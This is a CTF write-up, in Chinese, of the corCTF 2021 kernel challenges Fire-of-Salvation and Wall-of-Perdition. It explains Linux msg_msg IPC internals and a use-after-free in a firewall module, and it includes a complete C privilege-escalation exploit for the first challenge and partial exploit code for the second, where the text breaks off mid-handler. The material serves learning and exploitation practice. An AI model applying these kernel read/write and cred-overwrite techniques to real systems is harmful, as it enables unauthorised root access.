# CorCTF2021 Msg_msg


# corCTF2021-msg_msg

在D^3CTF2022中的d3kheap，看上去是比较简单的一道题目，我（A Linux kernel newbie）一直苦于如何leak内核地址信息。在official writep中提到了msg_msg可以leak。所以我就去找了相关的资料，发现了这两个题目 `corCTF2021` 的 `Fire-of-Salvation` 和 `Wall-of-Perdition` 。这两个题目是一个系列，前者为简单模式，后者为困难模式。比赛中为零解，作者在博客中使用 `msg_msg` 结构构造了内核任意地址读写原语。

题目Github仓库：

[corCTF-2021-public-challenge-archive/pwn at main · Crusaders-of-Rust/corCTF-2021-public-challenge-archive](https://github.com/Crusaders-of-Rust/corCTF-2021-public-challenge-archive/tree/main/pwn)

## 程序分析

两个题目都实现了Netfilter hooks，可以对内核收到网络数据包进行回调处理。但是与本题利用无关，更详细的知识可以看下面的博客：

[Linux Kernel Communication - Netfilter Hooks](https://infosecwriteups.com/linux-kernel-communication-part-1-netfilter-hooks-15c07a5a5c4e)

模块实现了5个功能：

- `firewall_add_rule` ：添加一条规则到指定的入站/出战的全局的链表中
- `firewall_delete_rule` ：从指定的链表中删除一条规则，对应位置置空
- `firewall_edit_rule` ：修改某一链表中的规则
- `firewall_show_rule` ：未实现具体功能
- `firewall_dup_rule` ：将一个链表上的规则复制到另一个链表上第一个为空的位置，副本规则的 `is_duplicated` 字段置为1

这实际也是一个菜单题。入站和出站的规则用两个全局指针维护：

```c
rule_t **firewall_rules_in;
rule_t **firewall_rules_out;
```

rule_t结构体如下：

```c
#ifdef EASY_MODE
#define DESC_MAX 0x800
#endif

typedef struct {
  char iface[16];
  char name[16];
  char ip[16];
  char netmask[16];
  uint8_t idx;
  uint8_t type;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
#ifdef EASY_MODE
  char desc[DESC_MAX];
#endif
} user_rule_t;

typedef struct {
  char iface[16];
  char name[16];
  uint32_t ip;
  uint32_t netmask;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
  uint8_t is_duplicated;
#ifdef EASY_MODE
  char desc[DESC_MAX];
#endif
} rule_t;
```

在 `EASY_MODE` 下，`rule_t` 结构大小为0x830，该内存会从`kmalloc-4096`中取出，而困难模式下，`rule_t` 的结构体大小只有 0x30 字节，该内存会从`kmalloc-64`中取出。这也是两个题目唯一的区别了。

模块的漏洞在于，delete一个链上的规则后，并不会将其副本进行free。从而构成了UAF。

```c
CONFIG_SLAB=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDEN=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_FG_KASLR=y

SMEP, SMAP, and KPTI are of course on. Note that this is an easier variation of the Wall of Perdition challenge.
```

内核使用`SLAB` 分配器，开启了freelist保护，且`modprobe_path`不可写，还开启了`FG_KASLR`。

## 内核IPC —— `msgsnd()`与`msgrcv()`源码分析

**介绍**：内核提供了两个syscall来进行IPC通信， [msgsnd()](https://linux.die.net/man/2/msgsnd) 和 [msgrcv()](https://linux.die.net/man/2/msgrcv)，内核消息包含两个部分，消息头 [msg_msg](https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9) 结构和紧跟的消息数据。长度从`kmalloc-64` 到 `kmalloc-4096`。消息头 [msg_msg](https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9) 结构如下所示。

```c
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;		// security指针总为0，因为未开启SELinux
	/* the actual message follows immediately */
};
```

### `msgsnd()` 数据发送

**总体流程**：当调用 [msgsnd()](https://linux.die.net/man/2/msgsnd) 来发送消息时，调用 [msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L966) -> [ksys_msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L953) -> [do_msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L840) -> [load_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84) -> [alloc_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L46) 来分配消息头和消息数据，然后调用 [load_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84) -> `copy_from_user()` 来将用户数据拷贝进内核。

重点看一下内存的分配：

```c
static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;

	msg->next = NULL;
	msg->security = NULL;

	len -= alen;
	pseg = &msg->next;
	while (len > 0) {
		struct msg_msgseg *seg;

		cond_resched();

		alen = min(len, DATALEN_SEG);
		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
		if (seg == NULL)
			goto out_err;
		*pseg = seg;
		seg->next = NULL;
		pseg = &seg->next;
		len -= alen;
	}

	return msg;

out_err:
	free_msg(msg);
	return NULL;
}
```

如果消息长度超过0xfd0，则分段存储，采用单链表连接，第1个称为消息头，用 [msg_msg](https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9) 结构存储；第2、3个称为segment，用 [msg_msgseg](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L37) 结构存储。消息的最大长度 `/proc/sys/kernel/msgmax`
确定， 默认大小为 8192 字节，所以最多链接3个成员。

![Untitled](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-671a9c7d13c7643329792cf53fe3e889.png)

### `msgsrv()` 数据接收

**总体流程**： [msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1265) -> [ksys_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1256) -> [do_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090) -> [find_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1066) & [do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018) & [free_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L169)。 调用 [find_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1066) 来定位正确的消息，将消息从队列中unlink，再调用 [do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018) -> [store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150)
 来将内核数据拷贝到用户空间，最后调用 [free_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L169) 释放消息。

```c
static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,
	       long (*msg_handler)(void __user *, struct msg_msg *, size_t))
{
	int mode;
	struct msg_queue *msq;
	struct ipc_namespace *ns;
	struct msg_msg *msg, *copy = NULL;
	DEFINE_WAKE_Q(wake_q);

// ...

		msg = find_msg(msq, &msgtyp, mode);
		if (!IS_ERR(msg)) {
			/*
			 * Found a suitable message.
			 * Unlink it from the queue.
			 */
			if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {
				msg = ERR_PTR(-E2BIG);
				goto out_unlock0;
			}
			/*
			 * If we are copying, then do not unlink message and do
			 * not update queue parameters.
			 */
			if (msgflg & MSG_COPY) {
				msg = copy_msg(msg, copy);
				goto out_unlock0;
			}

			list_del(&msg->m_list);
			msq->q_qnum--;
			msq->q_rtime = ktime_get_real_seconds();
			ipc_update_pid(&msq->q_lrpid, task_tgid(current));
			msq->q_cbytes -= msg->m_ts;
			atomic_sub(msg->m_ts, &ns->msg_bytes);
			atomic_dec(&ns->msg_hdrs);
			ss_wakeup(msq, &wake_q, false);

			goto out_unlock0;
		}

// ...

out_unlock0:
	ipc_unlock_object(&msq->q_perm);
	wake_up_q(&wake_q);
out_unlock1:
	rcu_read_unlock();
	if (IS_ERR(msg)) {
		free_copy(copy);
		return PTR_ERR(msg);
	}

	bufsz = msg_handler(buf, msg, bufsz);
	free_msg(msg);

	return bufsz;
}
```

如果发现了合适的消息，会将其拷贝给用户，若是未设置`MSG_COPY` 字段，会将消息进行unlink。

消息拷贝：[do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018) -> [store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150) 。和创建消息的过程一样，先拷贝消息头（`msg_msg`结构对应的数据），再拷贝segment（`msg_msgseg`结构对应的数据）。

```c
static long do_msg_fill(void __user *dest, struct msg_msg *msg, size_t bufsz)
{
	struct msgbuf __user *msgp = dest;
	size_t msgsz;

	if (put_user(msg->m_type, &msgp->mtype))
		return -EFAULT;

	msgsz = (bufsz > msg->m_ts) ? msg->m_ts : bufsz;
	if (store_msg(msgp->mtext, msg, msgsz))
		return -EFAULT;
	return msgsz;
}

int store_msg(void __user *dest, struct msg_msg *msg, size_t len)
{
	size_t alen;
	struct msg_msgseg *seg;

	alen = min(len, DATALEN_MSG);
	if (copy_to_user(dest, msg + 1, alen))
		return -1;

	for (seg = msg->next; seg != NULL; seg = seg->next) {
		len -= alen;
		dest = (char __user *)dest + alen;
		alen = min(len, DATALEN_SEG);
		if (copy_to_user(dest, seg + 1, alen))
			return -1;
	}
	return 0;
}
```

**消息释放**：[free_msg](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L169)。先释放消息头，再释放segment。

```c
void free_msg(struct msg_msg *msg)
{
	struct msg_msgseg *seg;

	security_msg_msg_free(msg);

	seg = msg->next;
	kfree(msg);
	while (seg != NULL) {
		struct msg_msgseg *tmp = seg->next;

		cond_resched();
		kfree(seg);
		seg = tmp;
	}
}
```

**[MSG_COPY](https://elixir.bootlin.com/linux/v5.8/source/include/uapi/linux/msg.h#L15)**：如果用flag [MSG_COPY](https://elixir.bootlin.com/linux/v5.8/source/include/uapi/linux/msg.h#L15)来调用 `msgrcv()` （内核编译时需配置`CONFIG_CHECKPOINT_RESTORE`选项，默认已配置），就会调用 [prepare_copy()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1037) 分配临时消息，并调用 [copy_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L118) 将请求的数据拷贝到该临时消息。在将消息拷贝到用户空间之后，原始消息会被保留，不会从队列中unlink，然后调用`free_msg()`删除该临时消息，这对于利用很重要。

为什么？因为本漏洞在第一次UAF的时候，没有泄露正确地址，所以会破坏`msg_msg->m_list`
双链表指针，unlink会触发崩溃

## Fire-of-Salvation

### 越界读泄露内核地址

首先，对一个rule_t进行UAF，只要add，dup，free即可。此时，我们控制了一个空闲的kmalloc-4096结构。

接着，发送一个0xfd0+0x30大小的消息。msg_msg结构会占据我们控制的kmalloc-4096，其next指向了一个kmalloc-64内存块。然后，通过UAF改大msg_msg的m_ts结构就能越界读segment后面的内存。

这里的问题是不能确定segment后面有什么样的地址信息。为此，我们可以在发送消息后，喷射大量的shm_file_data结构。

```c
struct shm_file_data {
	int id;
	struct ipc_namespace *ns;
	struct file *file;
	const struct vm_operations_struct *vm_ops;
};
```

这样就可以读到init_ipc_ns的值，该数据为全局变量不受FG_KALSR影响。

```c
  send_msg(qid, message, 0x1010 - 0x30, 0);

  printf("[*] Heap spary...\n");
  heap_spary(0x80);

  printf("[*] Edit msg...\n");
  ((struct msg_msg *)rule)->m_list.next = (void *)0xAAAAAAAA;
  ((struct msg_msg *)rule)->m_list.prev = (void *)0xBBBBBBBB;
  ((struct msg_msg *)rule)->m_ts = 0x1000 + 0x500;
  ((struct msg_msg *)rule)->m_type = 1;
  rule->idx = 0;
  rule->type = OUTBOUND;
  strcpy(rule->ip, "000000000");
  ioctl(global_fd, EDIT_RULE, rule);

  uint64_t *dump = calloc(1, 0x1500);
  printf("[+] dump:\t%p\n", dump);
  ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  if (ret < 0) {
    die("[!] Failed to recv message");
  }
  int i;
  for (i = 0xff0 / 8; i < 0x1500 / 8; i++) {
    if ((dump[i] & 0xfff) == 0x7a0) {
      init_ipc_ns = dump[i];
      printf("[+] index: %d\n", i);
      break;
    }
  }
  kernbase = init_ipc_ns - 0xc3d7a0;
  init_task = kernbase + 0xc124c0;
  init_cred = kernbase + 0xc33060;
```

这样我们得到了内核基址，init_task和init_cred。

## 任意地址读 & task_struct 遍历

我们使用了`MSG_COPY`，内核中的消息并没有被free，可供我们多次读取。我们可以UAF修改next字段为任意值，实现任意地址读。

通过遍历init_task的tasks链表，找到当前进程的task_struct。

```c
  printf("[*] Task struct searching...\n");

  pid_t pid = getpid();
  printf("[+] self pid:\t%d\n", pid);
  uint64_t cur = init_task;
  for (;;) {
    pid_t cur_id = 0;

    bzero(rule->ip, 16);
    ip_value_to_str(cur + 0x290, rule->ip, 16);
    ip_value_to_str((cur + 0x290) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);
    bzero(dump, 0x1500);
    ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    if (ret < 0) {
      die("[!] Failed to recv message");
    }

    // read pid
    cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8));
    printf("[+] cur:\t0x%lx, pid:\t%d\n", cur, cur_id);
    if (cur_id == pid) {
      task_struct = cur;
      break;
    }
    // next
    cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298;
  }
  printf("[+] task_struct:\t0x%lx\n", task_struct);
```

### 任意地址写

在发送消息时，内核先将内存空间准备好，再进行数据拷贝。我们可以使用userfaultfd，在其拷贝msg_msg结构数据时，挂起。修改其next字段指向当前进程的cred-8，保持segment的next为NULL。

释放，修改cred和real_cred为init_cred实现提权。

### EXP

```c
#include "./exploit.h"

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

#define DESC_MAX 0x800

typedef struct {
  char iface[16];
  char name[16];
  char ip[16];
  char netmask[16];
  uint8_t idx;
  uint8_t type;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
  char desc[DESC_MAX];
} user_rule_t;

struct list_head {
  struct list_head *next, *prev;
};

struct msg_msg {
  struct list_head m_list;
  long m_type;
  size_t m_ts;    /* message text size */
  void *next;     /* struct msg_msgseg *next; */
  void *security; //无SELinux，这里为NULL
                  /* the actual message follows immediately */
};

typedef struct {
  long mtype;
  char mtext[1];
} msg;

int global_fd;
uint64_t kernbase, init_ipc_ns, init_task, init_cred;
uint64_t task_struct;
int qid;
char msg_buf[0x2000];

void ip_value_to_str(int ip, char *result, int size) {
  inet_ntop(AF_INET, (void *)&ip, result, size);
}

void add_rule(user_rule_t *rule) {
  int ret = 0;
  ret = ioctl(global_fd, ADD_RULE, rule);
  if (ret < 0) {
    die("[!] Failed to add rule");
  }
}

void dup_rule(user_rule_t *rule) {
  int ret = 0;
  ret = ioctl(global_fd, DUP_RULE, rule);
  if (ret < 0) {
    die("[!] Failed to dup rule");
  }
}

void del_rule(user_rule_t *rule) {
  int ret = 0;
  ret = ioctl(global_fd, DELETE_RULE, rule);
  if (ret < 0) {
    die("[!] Failed to del rule");
  }
}

void send_msg(int id, void *buf, size_t size, int flags) {
  if (msgsnd(id, buf, size, flags) < 0) {
    die("[!] Failed to send msg");
  }
  printf("[+] Send message: 0x%lx\n", size);
}

void heap_spary(size_t cnt) {
  int i = 0;
  int shmid = 0;
  void *addr = NULL;
  for (i = 0; i < cnt; i++) {
    shmid = shmget(IPC_PRIVATE, 100, 0600);
    if (shmid < 0) {
      die("[!] shmget failed");
    }
    addr = shmat(shmid, NULL, 0);
    if (addr == (void *)-1) {
      die("[!] shmat failed");
    }
  }
  printf("[+] heap_spary shm, cnt:\t0x%lx\n", cnt);
}

static void fault_handler_thread(void *arg) {
  puts("[+] entered fault_handler_thread!");

  static struct uffd_msg uf_msg;
  uint64_t uffd = (uint64_t)arg;
  struct pollfd pollfd;
  int nready;

  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  puts("[+] polling...");
  while ((nready = poll(&pollfd, 1, -1)) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      die("[!] poll failed\n");
    }
    if ((read(uffd, &uf_msg, sizeof(uf_msg))) == 0) {
      die("[!] read uffd msg failed\n");
    }
    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      die("[!] unexpected pagefault\n");
    }

    printf("[+] page fault: %p\n", (void *)uf_msg.arg.pagefault.address);

    printf("[*] Change next to task_struct->cred\n");
    user_rule_t *rule = calloc(1, sizeof(user_rule_t));
    ((struct msg_msg *)rule)->m_list.next = (void *)0xAAAAAAAA;
    ((struct msg_msg *)rule)->m_list.prev = (void *)0xBBBBBBBB;
    ((struct msg_msg *)rule)->m_ts = 0x1000 + 0x500;
    ((struct msg_msg *)rule)->m_type = 1;
    rule->idx = 1;
    rule->type = OUTBOUND;
    ip_value_to_str(task_struct + 0x530, rule->ip, 16);
    ip_value_to_str((task_struct + 0x530) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);

    bzero(msg_buf, 0x2000);
    int idx = 0xfd0 / 8;
    ((uint64_t *)msg_buf)[idx++] = init_cred;
    ((uint64_t *)msg_buf)[idx++] = init_cred;
    ((uint64_t *)msg_buf)[idx++] = init_cred;
    ((uint64_t *)msg_buf)[idx++] = init_cred;

    uffd_copy(uffd, msg_buf, &uf_msg);
    break;
  }
  puts("[+] exit fault_handler_thread!");
}

int main() {
  user_rule_t *rule = calloc(1, sizeof(user_rule_t));
  msg *message = (msg *)msg_buf;
  int ret = 0;
  global_fd = open("/dev/firewall", O_RDWR);
  if (global_fd < 0) {
    die("[!] Failed to open /dev/firewall");
  }
  qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid < 0) {
    die("[!] Failed to msgget");
  }
  printf("[+] qid = %d\n", qid);

  printf("[*] UAF prepare...\n");
  rule->idx = 0;
  rule->type = INBOUND;
  strcpy(rule->netmask, "255.255.255.255");
  strcpy(rule->ip, "127.0.0.1");

  add_rule(rule);
  dup_rule(rule);
  del_rule(rule);

  printf("[*] Send message\n");
  bzero(msg_buf, 0x2000);
  message->mtype = 1;
  memset(message->mtext, 'A', 0x1010);
  send_msg(qid, message, 0x1010 - 0x30, 0);

  printf("[*] Heap spary...\n");
  heap_spary(0x80);

  printf("[*] Edit msg...\n");
  ((struct msg_msg *)rule)->m_list.next = (void *)0xAAAAAAAA;
  ((struct msg_msg *)rule)->m_list.prev = (void *)0xBBBBBBBB;
  ((struct msg_msg *)rule)->m_ts = 0x1000 + 0x500;
  ((struct msg_msg *)rule)->m_type = 1;
  rule->idx = 0;
  rule->type = OUTBOUND;
  strcpy(rule->ip, "000000000");
  ioctl(global_fd, EDIT_RULE, rule);

  uint64_t *dump = calloc(1, 0x1500);
  printf("[+] dump:\t%p\n", dump);
  ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  if (ret < 0) {
    die("[!] Failed to recv message");
  }
  int i;
  for (i = 0xff0 / 8; i < 0x1500 / 8; i++) {
    if ((dump[i] & 0xfff) == 0x7a0) {
      init_ipc_ns = dump[i];
      printf("[+] index: %d\n", i);
      break;
    }
  }
  kernbase = init_ipc_ns - 0xc3d7a0;
  init_task = kernbase + 0xc124c0;
  init_cred = kernbase + 0xc33060;
  printf("[+] kernbase:\t0x%lx\n", kernbase);
  printf("[+] init_ipc_ns:\t0x%lx\n", init_ipc_ns);
  printf("[+] init_task:\t0x%lx\n", init_task);
  printf("[+] init_cred:\t0x%lx\n", init_cred);

  printf("[*] Task struct searching...\n");

  pid_t pid = getpid();
  printf("[+] self pid:\t%d\n", pid);
  uint64_t cur = init_task;
  for (;;) {
    pid_t cur_id = 0;

    bzero(rule->ip, 16);
    ip_value_to_str(cur + 0x290, rule->ip, 16);
    ip_value_to_str((cur + 0x290) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);
    bzero(dump, 0x1500);
    ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    if (ret < 0) {
      die("[!] Failed to recv message");
    }

    // read pid
    cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8));
    printf("[+] cur:\t0x%lx, pid:\t%d\n", cur, cur_id);
    if (cur_id == pid) {
      task_struct = cur;
      break;
    }
    // next
    cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298;
  }
  printf("[+] task_struct:\t0x%lx\n", task_struct);

  printf("[*] UAF again...\n");
  rule->idx = 1;
  rule->type = INBOUND;
  strcpy(rule->netmask, "255.255.255.255");
  strcpy(rule->ip, "127.0.0.1");

  add_rule(rule);
  dup_rule(rule);
  del_rule(rule);

  void *target = mmap((void *)0xdea1000, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  if (target == MAP_FAILED) {
    die("[!] Failed to mmap target");
  }
  target = (void *)(0xdea2000 - 8);
  *(uint32_t *)target = 1;
  RegisterUserfault((void *)0xdea2000, fault_handler_thread);

  send_msg(qid, target, 0x1010 - 0x30, 0);
  pop_shell();

  return 0;
}
```

## Wall-of-Perdition

UAF依然存在，但在kmalloc-64中。我们依然可以通过修改m_ts进行越界读。在我们得到内核的基址后，似乎并不能进行任意地址写了。

实现任意地址写需要控制next指针，如果想要控制msg_msg结构的next，消息大小就大于64，不会申请到kmalloc-64。如果想控制kmalloc-64的segment的next，m_ts不能修改，不能进行越界。另一种思路是直接修改next，但是此时会遇到与第一种相同的情况，segment大小大于64无法UAF。

实现任意写最重要的是使一个msg_msg结构出现在可控的空间。

### 泄露内核基址 & msg 链表

构造一个UAF的kmalloc-64，然后申请两个消息队列：

```c
  qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid[0] < 0) {
    die("[!] Failed to msgget");
  }
  qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid[1] < 0) {
    die("[!] Failed to msgget");
  }
  printf("[+] qid[0] = %d, qid[1] = %d\n", qid[0], qid[1]);
```

在QID#0上发送一个0x10的消息（实际0x10+0x30），QID#1上发送一个0x10的消息，再发送一个0xfd0+0xff8大小的消息。

```c
  bzero(msg_buf, 0x2000);
  message->mtype = 1;
  memset(message->mtext, 0x41, 0x10);
  send_msg(qid[0], message, 0x40 - 0x30, 0);
  memset(message->mtext, 0x42, 0x10);
  send_msg(qid[1], message, 0x40 - 0x30, 0);
  send_msg(qid[1], message, 0x1ff8 - 0x30, 0);
```

此时，QID#0上的消息就是UAF控制的kmalloc-64块。

此时的堆布局如下

![https://syst3mfailure.io/assets/images/wall_of_perdition/1.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-9d961fa4c7bafd23e4a5d9065eeb43cf.png)

一个msg_msg消息的最大为0x2000，我们修改QID#0消息的大小，读取数据。因为QID#0和QID#1的0x10消息属于同一个大小，两者的距离可能很近。我们就能读取QID#2的0x10消息的list_head，还能得到全局变量 `dynamic_kobj_ktype` 泄露内核基址。题目作者泄露的是**sysfs_bin_kfops_ro。 如下图：**

![https://syst3mfailure.io/assets/images/wall_of_perdition/2.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-562b8e6c4fdca71d7dcec9d6913deabf.png)

```c
  ((struct msg_msg *)rule)->m_list.next = (void *)0xAAAAAAAA;
  ((struct msg_msg *)rule)->m_list.prev = (void *)0xBBBBBBBB;
  ((struct msg_msg *)rule)->m_ts = 0x2000;
  ((struct msg_msg *)rule)->m_type = 1;
  rule->idx = 0;
  rule->type = OUTBOUND;
  strcpy(rule->ip, "000000000");
  ioctl(global_fd, EDIT_RULE, rule);

  void *dump = calloc(1, 0x2000);
  printf("[+] dump:\t%p\n", dump);
  ret = msgrcv(qid[0], dump, 0x2000, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  if (ret < 0) {
    die("[!] Failed to recv message");
  }
  int i = 0;
  uint64_t val = 0;
  for (i = 0; i < 0x2000 / 8; i++) {
    val = ((uint64_t *)dump)[i];
    if ((val & 0xffffffff) == 0x42424242) {
      next = ((uint64_t *)dump)[i - 6];
      prev = ((uint64_t *)dump)[i - 5];
      // skip
      i++;
    }
    if ((val & 0xffff) == 0x1600) {
      dynamic_kobj_ktype = val;
    }
    if ((dynamic_kobj_ktype != 0) && (next != 0) && (prev != 0))
      break;
  }
  if (((int64_t)next >= 0) || ((int64_t)prev >= 0)) {
    printf("[!] Failed to get next and prev, try again\n");
    goto done;
  }
  kernbase = dynamic_kobj_ktype - 0xc41600;
  init_task = kernbase + 0xc124c0;
  init_cred = kernbase + 0xc33060;
```

这里得到next和prev的值有一定的概率。

### 任意地址读 & task_struct 遍历

修改UAF的块的next为目标地址-8即可实现任意地址读，同第一题对tasks进行遍历找到当前进程的task_struct。

```c
  printf("[*] Task struct searching...\n");

  pid_t pid = getpid();
  printf("[+] self pid:\t%d\n", pid);
  uint64_t cur = init_task;
  ((struct msg_msg *)rule)->m_ts = 0xfd0 + 0x200;
  for (;;) {
    pid_t cur_id = 0;

    bzero(rule->ip, 16);
    ip_value_to_str(cur + 0x290, rule->ip, 16);
    ip_value_to_str((cur + 0x290) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);
    bzero(dump, 0x1500);
    ret = msgrcv(qid[0], dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    if (ret < 0) {
      die("[!] Failed to recv message");
    }

    // read pid
    cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8));
    printf("[+] cur:\t0x%lx, pid:\t%d\n", cur, cur_id);
    if (cur_id == pid) {
      task_struct = cur;
      break;
    }
    // next
    cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298;
  }
  printf("[+] task_struct:\t0x%lx\n", task_struct);
```

### 堆风水构造任意地址写

下面到了最关键的部分，我们将通过堆风水与userfaultfd实现任意地址写，从而提权！

首先，接收QID#1的所有消息，不带MSG_COPY标志。这样QID#1中的kmalloc-64和两个kmalloc-4096都被free了，且先被free的是msg_msg部分。

![https://syst3mfailure.io/assets/images/wall_of_perdition/5.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-52863bf05c8addae24e0e806de3cd178.png)

接着，我们再申请一个消息队列QID#2，发送一个0x1ff8 - 0x30大小的消息，msg_msg使用的正是原来的segment结构，而其next指向了原本的msg_msg结构，这部分的地址是我们已知的，即list_head→next。同时，我们在其拷贝msg_msg消息数据时，使用userfaultfd卡住。布局如下图：

![https://syst3mfailure.io/assets/images/wall_of_perdition/7.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-1497edaba6180bf0f0f874817c827846.png)

在userfault handler中，修改QID#0的消息的next指向QID#2消息的segment，修正其list和m_ts，然后接收所有消息，不带MSG_COPY标志。这样，QID#2的segment就会被free了。

```c
    printf("[+] page fault: %p\n", (void *)uf_msg.arg.pagefault.address);
    printf("[*] Modified msg0 next to msg2's segment\n");
    user_rule_t *rule = calloc(1, sizeof(user_rule_t));
    ((struct msg_msg *)rule)->m_list.next = (void *)prev;
    ((struct msg_msg *)rule)->m_list.prev = (void *)prev;
    ((struct msg_msg *)rule)->m_ts = 0x10;
    ((struct msg_msg *)rule)->m_type = 1;
    rule->idx = 0;
    rule->type = OUTBOUND;
    ip_value_to_str(next, rule->ip, 16);
    ip_value_to_str((next) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);
    char buf[0x10];
    msgrcv(qid[0], buf, 0x10, 0, IPC_NOWAIT | MSG_NOERROR);

    printf("[*] Prepare fake msg struct\n");
    bzero(msg_buf, sizeof(msg_buf));
    ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))->next =
        (void *)(task_struct + 0x530);
    ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))->m_ts = 0xff8;
    ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))->m_type = 1;
    printf("[*] Now userfault 2\n");
    ((msg *)(target2 + PAGE_SIZE - 0x10))->mtype = 1;
    send_msg(qid[3], target2 + PAGE_SIZE - 0x10, 0xff8, 0);
```

堆布局如下：

![https://syst3mfailure.io/assets/images/wall_of_perdition/9.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-6ad8a7575a4daad28a9d7d65e34a70ea.png)

接着，不释放userfault handler1。而是申请一个新的消息队列QID#3。并创建一个0xfd8+0x30的消息。此时，QID#2的segment被分配给了新的msg_msg结构。同样，我们在QID#3拷贝消息数据时，使用userfaultfd卡住。堆布局如下：

![https://syst3mfailure.io/assets/images/wall_of_perdition/10.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-2f5cfb64523b7c423f80095d97fdfc92.png)

在userfaulr handler2中，释放userfault handler1。使得QID#3的msg_msg结构的next被修改为目标地址。即当前进程的task_struct→cred -8 

堆布局如下：

![https://syst3mfailure.io/assets/images/wall_of_perdition/11.png](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-f383f31c66e169b1e9fea090cbdd71b4.png)

继续处理userfault 2，使用init_cred覆写cred和read_cred即可提权。

```c
    printf("[+] user 2 page fault: %p\n", (void *)uf_msg.arg.pagefault.address);
